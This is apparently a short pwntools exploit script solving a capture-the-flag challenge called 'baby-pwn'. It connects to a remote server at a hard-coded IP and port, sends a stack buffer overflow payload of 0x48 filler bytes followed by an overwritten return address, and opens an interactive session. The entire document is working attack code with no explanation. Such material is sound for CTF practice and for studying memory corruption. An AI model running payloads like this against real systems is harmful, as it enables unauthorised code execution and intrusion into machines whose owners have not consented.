from pwn import *

exe = ELF('./baby-pwn', checksec=False)
p = remote("34.162.142.123", 5000)
# p = process(exe.path)

payload = b'a'*0x48 + p64(0x401166)
p.sendlineafter(b'text: ', payload)

p.interactive()